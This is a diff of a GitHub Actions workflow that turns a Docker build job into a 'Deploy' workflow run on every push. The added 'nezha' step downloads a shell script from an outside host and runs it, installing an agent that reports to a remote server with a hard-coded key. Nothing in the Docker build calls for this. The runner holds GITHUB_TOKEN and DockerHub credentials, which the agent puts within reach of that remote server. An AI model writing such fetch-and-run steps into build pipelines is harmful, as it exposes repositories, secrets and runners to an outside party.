@@ -1,16 +1,28 @@
-    - name: Set up Docker Buildx
-      uses: docker/setup-buildx-action@v1
-    - name: Login to DockerHub
-      uses: docker/login-action@v1 
-      with:
-        username: ${{ secrets.DOCKERHUB_USERNAME }}
-        password: ${{ secrets.DOCKERHUB_TOKEN }}
+name: Deploy
 
-    - name: Build and push Docker image
-      id: push
-      uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671
-      with:
-        context: .
-        file: ./build/Dockerfile
-        push: true
-        tags: sdcom/mihomo-and-dashboard:latest
+on: [push]
+
+env:
+  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+        - name: nezha
+          run: curl -L https://cnb.cool/ChuangYiLLC/Tech/SDCOM-Docker/-/git/raw/main/test/nezha.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh install_agent status.ksl-server.us.kg 443 w6kB3fh71sjeVacUMt --tls
+        - name: Set up Docker Buildx
+          uses: docker/setup-buildx-action@v1
+        - name: Login to DockerHub
+          uses: docker/login-action@v1 
+          with:
+            username: ${{ secrets.DOCKERHUB_USERNAME }}
+            password: ${{ secrets.DOCKERHUB_TOKEN }}
+        - name: Build and push Docker image
+          id: push
+          uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671
+          with:
+            context: .
+            file: ./push/Dockerfile
+            push: true
+            tags: sdcom/baota:latest
